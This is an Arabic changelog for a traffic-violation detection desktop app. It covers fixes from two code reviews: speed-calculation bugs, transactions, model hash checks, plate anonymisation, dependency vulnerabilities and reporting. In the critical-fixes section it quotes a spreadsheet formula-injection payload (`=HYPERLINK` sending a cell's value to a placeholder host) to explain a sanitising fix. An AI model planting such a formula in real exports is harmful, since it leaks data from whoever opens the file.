<div dir="rtl">

# سجل التغييرات

يتبع [Keep a Changelog](https://keepachangelog.com/ar/1.1.0/)
و[الإصدار الدلالي](https://semver.org/lang/ar/).

---

## [غير مُصدَر]

### تنفيذ خطة مراجعة مِحَك

تنفيذ كامل لخطة الإصلاح في
[`docs/reviews/mihak-review-2026-09-20.md`](docs/reviews/mihak-review-2026-09-20.md)
(٢٥ بنداً: ٣ حرجة، ١١ مهمة، ١١ تحسينية).

#### 🔴 إصلاحات حرجة

- **السرعة كانت تُضرَب في `frame_stride`.** `speed_from_centers_kmh` تحسب الزمن
  كـ`(عدد المراكز − 1) ÷ fps`، أي تفترض إطاراً واحداً بين كل مركزين — وهذا يصحّ
  عند `stride = 1` وحده، بينما الواجهة تعرض stride حتى 30. القياس: مركبة بـ٥٤
  كم/س تُحسب **٢٧٠ كم/س** عند `stride=5`، فتُسجَّل «سرعة زائدة» لكل مركبة
  ويتلوّث معها كاشف المسافة الآمنة (يبني TTC على السرعتين). حُلَّت بدالة
  `speed_from_timed_centers_kmh` تحسب الزمن من `timestamp_ms` المخزَّن — فلا
  يبقى للـstride أثر. وأُضيف اختبار stride-invariance لـ1 و2 و3 و5 و10.
- **عيّنة `HighBeamDetector` كانت تنحرف مع الـstride** (`frame_no % n == 0` يُبقي
  مضاعفات 15 عند stride=3 — سُدس المعدّل وبتباعد غير منتظم). صارت العيّنة
  بالمسافة الزمنية: أول كشف يبعد `n` إطاراً أو أكثر عن آخر مأخوذ.
- **Formula Injection في تصدير CSV/Excel.** `notes` و`license_plate`
  و`video_filename` تُكتب خاماً، فقيمة مثل `=HYPERLINK("http://x/?"&A1,…)`
  تُقيَّم في Excel على جهاز **من يفتح التقرير**. أُضيفت `sanitize_cell()` تسبق كل
  نص يبدأ بـ`= + - @ \t \r` بفاصلة عليا، وتُطبَّق في CSV وExcel.

#### 🟠 إصلاحات مهمة

- **فقدان بيانات صامت في `_store_detections`**: نفس عيب «`DELETE` ثم `INSERT` بلا
  معاملة» الذي أُصلح في `extract_violations` وبقي هنا. لُفَّ الحذف والإدراج
  وتحديث الحالة في `db.transaction()` واحدة.
- **«التكرار التام» كان مبنياً على بصمة جزئية**: `file_hash` يقرأ أول ٤ م.ب وآخر
  ٤ م.ب والحجم، والإسقاط التلقائي عليه كان يرفض دليلاً مختلفاً بصمت. أُضيفت
  `full_file_hash` لتأكيد المطابقة قبل الإسقاط (تُحسب عند الاشتباه فقط)، ونُقل
  منطق التكرار إلى `app/core/duplicates.py`. وفحص التكرار صار **قبل** توليد
  الصورة المصغّرة فلا تبقى ملفات يتيمة.
- **بصمات النماذج**: `scripts/download_models.py` صار **يفشل مُغلَقاً** بلا بصمة
  مثبَّتة بدل التنزيل بلا تحقق، ويتحقق من ملف موجود بدل تخطيه، ويكتب بصمة
  مجاورة `<model>.sha256`. و`app/core/model_integrity.py` يطابقها عند **كل**
  تحميل — ملفات `.pt` حمولات pickle تُنفِّذ كوداً.
- **ملح التجهيل**: كان افتراضياً ومنشوراً، وفضاء اللوحة السعودية ≈١٠⁷، فرموز
  `PLATE-XXXXXXXXXX` قابلة للعكس بجدول أقواس. صار `ensure_anon_salt()` يولّد
  ملحاً عشوائياً (١٢٨ بت) عند أول تشغيل ويحفظه، والتجهيل `HMAC-SHA256` بمفتاح
  سرّي لا هاشاً على نص مُجمَّع، والواجهة تحذّر قبل تصدير «مجهّل» بملح افتراضي.
- **إخفاقات الاستدلال كانت تُبتلع**: `InferenceWorker` يُرجع الآن
  `InferenceReport(results, failures, cancelled)` وتبويب التصنيف يعرض المقاطع
  الفاشلة — بدل «اكتمل استدلال ٣٠ مقطع» وقد سقط ٢٠.
- **الخروج أثناء عمل عامل** كان يُغلق القاعدة من تحته (استعلامات على اتصال مُغلق
  و`QThread: Destroyed while thread is still running`). أُضيفت
  `runner.cancel_and_wait()` ويستدعيها `MainWindow.closeEvent` قبل إغلاق القاعدة.
- **N+1 في تبويب التحليل**: `readiness()` كانت خمس عمليات I/O لكل صف في الـmain
  thread (~٢٥٠٠ استعلام لمكتبة ٥٠٠ مقطع عند كل تحديث، وتُكرَّر في
  `_explain_zero_violations`). أُضيفت `readiness_bulk()` بأربعة استعلامات
  مجمَّعة في `app/core/readiness.py`.
- **التصدير كان في الـmain thread** بلا تقدّم ولا إلغاء. صار في
  `app/workers/export_worker.py` مع شريط تقدّم وتعطيل الأزرار.
- **لا طريقة لحذف مقطع من المكتبة** (`delete_video` يستدعيها حوار التكرارات
  وحده). أُضيف زر حذف مع تأكيد ينصّ أن ملف الفيديو الأصلي يبقى على القرص.
- **جداول PDF بعرض ٠٫٤٢ سم**: `colWidths` كانت أرقاماً مجرّدة أي **نقاطاً** لا
  سنتيمترات، فالنص يفيض فوق الحدود ويتراكب في التقرير العربي. صارت بالسنتيمترات
  (١٢ و١٦ سم داخل ١٧ سم متاحة) وخلايا النص `Paragraph` تلتف، مع اختبار يتحقق أن
  الجدول يستغل ≥٦٠٪ من العرض.
- **ساعة المخالفة كانت ساعة بداية المقطع**: التجميع على `recorded_at` وحده ينسب
  كل مخالفات مقطع CCTV مدّته ثلاث ساعات إلى ساعة واحدة. صارت لحظة المخالفة
  `recorded_at + start_ms`. وأُضيف عدّ المخالفات المستثناة من الرسوم الزمنية
  (مقطعها بلا تاريخ) مع تنبيه في الداشبورد، وحوار لإدخال تاريخ التسجيل يدوياً.

#### 🟡 تحسينات

- نمط threading موحّد: `_ExtractWorker` و`TrainingWorker` صارا يُشغَّلان عبر
  `runner.run_worker` مثل البقية (العامل نُقل إلى `app/workers/extract_worker.py`).
- فلاتر جدول الداشبورد لا تُعيد بناء الرسوم والخريطة الحرارية بلا سبب.
- `PlaceholderTab` (كود ميت) و`_ = exc` حُذفا؛ و`assert` كعقد تشغيلي (٨ مواضع)
  استُبدل باستثناءات صريحة — `assert` يُحذف بـ`python -O`.
- `OCRService` يقرأ `use_gpu` من الإعدادات ويرجع إلى CPU بتحذير بدل صمت تام.
- صلاحيات القاعدة والتصديرات وملف `.env` تُضيَّق إلى المستخدم وحده على POSIX.
- حدود المدخلات: اللوحة ١٢ محرفاً، الملاحظات ٢٠٠٠ بعدّاد، ووقت المخالفة يجب أن
  يكون داخل مدة المقطع.
- أهداف اللمس المريحة (٤٤px) لأزرار الجداول، وترتيب focus صريح في حوار الإدخال.
- `list_violations_for_editing` تُرجع `EditableViolationRow` بحقول مُسمّاة بدل
  tuple بمؤشرات رقمية.
- شجرة README و`.env.example` صُحِّحتا.
- **الاختبارات: ٣٣٧ → ٣٩١، والتغطية ٧١٪ → ٧٣٪.** الجديد في
  `tests/test_mihak_fixes.py`، ويشمل أول اختبار لـ`app/main.py` (كان ٠٪).

---

تنفيذ كامل لخطة الإصلاح في
[`docs/reviews/comprehensive-review-2026-07-29.md`](docs/reviews/comprehensive-review-2026-07-29.md)
(٣٠ بنداً: ٥ حرجة، ١٢ مهمة، ١٣ تحسينية).

### 🔴 إصلاحات حرجة

- **قراءة اللوحات كانت معطّلة في كل تثبيت جديد.** `paddleocr>=2.8.0` بلا حد
  أعلى كان يسحب 3.x الذي أزال `use_angle_cls`/`use_gpu`/`show_log` ومعامل
  `cls` — فيرتفع `TypeError` **يُبتلع بصمت** ويبقى عمود اللوحات فارغاً دائماً.
  ثُبِّت الحد `<3`.
- **`HighBeamDetector` كان يستهلك ~11 ج.ب ذاكرة** لمقطع 5 دقائق 1080p (يقرأ كل
  الإطارات المسحوبة دفعة واحدة). صار يعالج إطاراً واحداً في كل لحظة، وفحص
  «هل الإطار ليلي؟» يُحسب مرة لكل إطار لا مرة لكل مركبة.
- **فقدان بيانات صامت عند فشل الاستخراج.** `DELETE` ثم `INSERT` كانا بلا
  معاملة، ففشل الإدراج يترك المقطع بلا مخالفات بعد حذف القديمة. أُضيف
  `Database.transaction()` ولُفَّت العملية به.
- **«تجهيز Dataset» كان يمحو `data/dataset/` بلا سؤال** (`shutil.rmtree`).
  أُضيف تأكيد يعرض المسار وعدد الملفات، ورفض للحالة التي يكون فيها المصدر هو
  الإخراج نفسه.
- **صور الأدلة كانت تُعنوَن بأرقام إطارات خاطئة** عند فشل قراءة أي إطار
  (`zip` يزاوج الصور الناجية بأرقام الإطارات الأصلية). صارت الدالة تُرجع
  أزواج `(رقم الإطار، الصورة)`.

### 🟠 إصلاحات مهمة

- **الخصوصية:** التصدير صار **مجهّلاً افتراضياً** — كل لوحة تُستبدَل برمز ثابت
  `PLATE-XXXXXXXXXX` (قابل للتجميع، غير قابل للعكس، وملحه قابل للتغيير عبر
  `BASEER_ANON_SALT`). أُضيف قسم «الخصوصية والبيانات» إلى README.
- **سلسلة التوريد:** حدود عليا لكل التبعيات، ملف مقفول بـhashes
  (`requirements-ci.lock`) يُثبَّت منه CI بـ`--require-hashes`، `pip-audit`
  و`mypy` في CI، `dependabot.yml` أسبوعي، وتحقق **فعلي** من بصمة SHA256 عند
  تنزيل النماذج (كانت تُحسب وتُطبع بلا مقارنة) مع تنزيل إلى ملف مؤقت.
- **إغلاق 27 ثغرة معروفة** كشفها `pip-audit` فور تفعيله:
  - **Pillow**: 24 ثغرة (decompression bomb + heap overflow) — والحدّ الأعلى
    `<12` كان يُثبّت المشروع **داخل** النطاق المُصاب. رُفع إلى `>=12.3.0,<13`.
    مهم هنا تحديداً لأن التطبيق يفتح صوراً مشتقة من ملفات خارجية غير موثوقة.
  - **click**: ثغرة حقن أوامر في `click.edit()`. الترقية كانت محجوبة بـ
    `scenedetect 0.6.x` الذي يفرض `click<8.3.0`؛ رُفع scenedetect إلى
    `>=0.7.1,<0.8` الذي أسقط هذا القيد (تحقّقنا من توافق الـAPI المستخدم).
  - **pytest**: رُفع إلى `>=9.0.3`.
  النتيجة: `pip-audit` يُرجع **0 ثغرة** على الملف المقفول وعلى الملف المصدر.
- **الترخيص:** اعتُمد **AGPL-3.0** (`LICENSE` + `docs/licensing.md`) — تبعية
  Ultralytics AGPL كانت تُحزَم في مُثبِّت مُوزَّع بينما الترخيص «TBD».
- **دقة كاشف الخوذة:** المدة تُحسب من أطول فترة **متتالية** لا من (الأخير −
  الأول)؛ كشفان تفصلهما دقائق كانا يُنتجان «مخالفة 13 ثانية».
- **الأداء:** التبويبات الخمسة تُبنى كسولاً، الصور المصغّرة تُقرأ في
  `QThreadPool`، البحث بـdebounce ‏250ms وفلترة داخل SQL، وكاشف المسافة الآمنة
  بفهرسة سلال-x بدل مقارنة كل الأزواج.
- **أزرار إيقاف** للاستيراد والاستخراج والاستدلال (`cancel()` كانت معرّفة
  ولا يستدعيها شيء)، والإلغاء صار نتيجة عادية بتقرير جزئي لا استثناء.
- **الوصولية:** لوحة ألوان جديدة كل تركيباتها تتجاوز **WCAG AA 4.5:1**
  (كانت أبيض على برتقالي = 2.2:1)، أسماء وصول لكل زر رمزي، حالة المراجعة
  بنص+رمز لا بلون وحده، وأهداف نقر أكبر.
- **المعمارية:** حُذف كل SQL خام من `app/ui/` (١٥ موضع `noqa: SLF001`) إلى
  توابع في الخدمات.
- **الموثوقية:** `QApplication` تُنشأ قبل أي تهيئة قد تفشل، وفشل فتح القاعدة
  يعرض `QMessageBox` بدل الموت الصامت في بناء `console=False`.
- **الشفافية:** الكواشف الفاشلة تُبلَّغ للمستخدم، وعمود «الجاهزية» يُظهر
  المتطلبات الناقصة، ورسالة تشرح سبب «0 مخالفة».

### 🟡 تحسينات

- **نظام تصميم** (`app/ui/theme.py`): لوحتا ألوان + QSS واحد، وتفعيل
  `BASEER_UI_THEME` الذي كان معرّفاً بلا قارئ. الرسوم واللوحة تتبع الثيم بدل
  فرض الأبيض/الداكن.
- **نظام ترحيلات** (`schema_migrations`) بدل `ALTER TABLE` مكدّسة في المخطط.
- **سجل تدقيق** (`audit_log`) لتغييرات المراجعة والتعديل والحذف مع القيمة
  السابقة، وتوثيق صريح أن `manual_user` ليس هوية مُصادَقاً عليها.
- **إعادة تنظيم الكواشف:** الكواشف الستة انتقلت من `rules.py` (622 سطراً) إلى
  `app/core/detectors/`، والأنواع المشتركة إلى `app/core/violations.py`.
  `rules.py` صار الـpipeline فقط (105 أسطر) ويُعيد تصدير كل شيء.
- **حدود بنية مفروضة في CI** (`scripts/check_structure.py`) — القاعدة كانت
  مُعلَنة في README بعلامة ✅ ومخروقة فعلياً.
- **التكرار الحسّي** يُقاس بمسافة Hamming بدل التساوي التام (`phash_distance`
  كانت مكتوبة ومُختبَرة وغير مستعملة).
- **أمان:** هروب HTML قبل الحقن في `QLabel`، تحقق من مخطط رابط CVAT،
  مهل تنفيذ لـffprobe/ffmpeg، وتحليل دفاعي موحّد لـJSON المخزَّن.
- **حتمية:** اسم الصورة المصغّرة صار SHA1 ثابتاً بدل `hash()` المُلَح عشوائياً.
- **خط عربي مُرفَق** (`assets/fonts/NotoNaskhArabic-Regular.ttf`, SIL OFL)
  ومحزوم في `Baseer.spec` — كان PDF يفشل بصمت إلى Helvetica بلا نص عربي.
- **`torch.jit` لم يعد مستبعَداً** من الـbundle (torch يستورده داخلياً).
- **حذف كود ميت:** `start_*_in_thread` الثلاث (≈70 سطراً) واستُبدلت بمشغّل
  موحّد `app/workers/runner.py`.
- **تجميع الإعدادات** (`get_settings` بـ`lru_cache`) بدل إعادة قراءة `.env`
  في مُنشئ كل خدمة.
- **واجهة أوضح:** «عرض س من ص» بدل بتر صامت عند 500، تنبيه عند تحويل مخالفة
  تلقائية إلى يدوية، اختصارات `F5` و`Ctrl+1..5`، حد أدنى لحجم النافذة،
  إعادة تدفّق بطاقات KPI، وأعمدة جداول تتمدّد مع النافذة.

### 🔍 اكتشافات جانبية من تفعيل الأدوات

- **`datetime.UTC` غير موجود في Python 3.10** بينما `pyproject.toml` يعلن
  `requires-python = ">=3.10"` — أي أن `app/core/annotator.py` كان **ينهار عند
  الاستيراد** على أدنى نسخة مدعومة. كشفه mypy فور تشغيله؛ استُبدل بـ
  `timezone.utc`.
- **`DashboardService.get_kpis` كان يفهرس ناتج `fetch_one` بلا فحص None** —
  انهيار محتمل على قاعدة في حالة غير متوقعة. كشفه mypy أيضاً.

### 🧪 الاختبارات

- من **231** إلى **337** اختباراً، ومن تغطية **43%** إلى **71%**.
- ملفات جديدة: `test_e2e_pipeline.py` (اختبار قبول للمسار الكامل)،
  `test_review_fixes.py`، `test_service_fixes.py`، `test_ui_views.py`،
  `test_video_utils.py`.
- `app/ui/` و`app/workers/` كانتا بتغطية **0%** بلا أي ملف اختبار.
- CI يفرض `--cov-fail-under=60`، و`pytest-qt` أُضيف إلى `requirements-ci.txt`.

---

## [0.1.0] — 2026-07

الإصدار الأول: مكتبة، تصنيف، تدريب، تحليل، داشبورد؛ ٩ كواشف مخالفات + إدخال
يدوي؛ تصدير JSON/CSV/Excel/PDF عربي؛ مُثبِّت ويندوز.

</div>
